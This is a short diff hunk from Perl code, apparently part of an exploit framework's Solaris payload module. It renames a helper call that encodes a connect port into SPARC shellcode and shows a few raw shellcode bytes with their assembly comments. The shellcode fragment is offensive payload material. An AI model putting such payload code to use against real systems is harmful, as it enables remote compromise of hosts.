@@ -23,7 +23,7 @@ sub SolarisPayload {
 
     my $hash = {
         Payload =>
-            Pex::SPARC::set($cport ^ 4095, "l5").
+            Pex::SPARC::Set($cport ^ 4095, "l5").
 #            "\x2b\x10\x50\x40".     # sethi        %hi(0x41410000), %l5
 #            "\xab\x35\x60\x10".     # srl          %l5, 16, %l5
             "\xaa\x1d\x6f\xff".     # xor          %l5, 4095, %l5
